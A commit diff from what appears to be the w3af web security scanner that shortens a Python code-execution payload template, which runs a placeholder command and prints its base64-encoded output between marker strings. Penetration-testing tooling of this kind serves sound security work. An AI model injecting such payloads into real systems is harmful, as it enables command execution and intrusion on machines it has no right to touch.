740915449ec103f86929bd99248b83364a8a80ed
Andres Riancho <andres.riancho@gmail.com>
2014-09-05 14:55:29 -0300

    Shorter shellcode

--- w3af/plugins/attack/payloads/code/code.py
+++ w3af/plugins/attack/payloads/code/code.py
@@ -1,7 +1,6 @@
-import sys
+import sys,commands,base64
 sys.stdout.write('15825b40c6dace2a'[::-1])
 if '__CMD_TO_RUN__':
-    import commands, base64
     sys.stdout.write(base64.b64encode(commands.getoutput('__CMD_TO_RUN__')))
 sys.stdout.write('7cf5d4ab8ed434d5'[::-1])
 sys.stdout.flush()
